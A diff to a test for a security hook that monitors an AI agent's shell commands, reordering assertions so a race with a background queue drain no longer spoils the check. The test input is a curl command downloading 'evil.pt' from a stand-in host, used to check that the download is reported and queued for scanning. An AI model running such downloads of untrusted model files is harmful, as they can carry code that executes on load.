@@ -264,10 +264,12 @@ test("end to end: the hook reports a model download (#76) and queues it without 
   mkdirSync(proj, { recursive: true });
   const out = await runHook(home, { hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command: "curl -L -o evil.pt https://models.example/evil.pt" }, session_id: "s-ms", cwd: proj });
   assert.ok(!/"permissionDecision":"deny"/.test(out), "report-only: the download is not blocked");
-  assert.ok(await until(() => c.alerts.some((a) => a.threatId === 76)), "the #76 report reached the console");
+  // Read at once: the posture beat this event spawned also drains the queue, and on a slow runner it did so
+  // before the #76 alert arrived, so a later read saw its scan state, not the hook's.
+  assert.ok(!existsSync(join(st, MODEL_SCAN_STATE)), "nothing was scanned on PreToolUse");
   const q = readQueue(st);
   assert.deepEqual(q.map((x) => x.path), [join(proj, "evil.pt")]);
-  assert.ok(!existsSync(join(st, MODEL_SCAN_STATE)), "nothing was scanned on PreToolUse");
+  assert.ok(await until(() => c.alerts.some((a) => a.threatId === 76)), "the #76 report reached the console");
   // The day's posture beat (spawned by that first event) also drains the queue. Let it finish first, so
   // what scans the file below can only be the modelscan worker the next event spawns.
   assert.ok(await until(() => c.beats.length > 0 && existsSync(join(st, "inventory-detectors.json"))), "the day's posture beat finished");
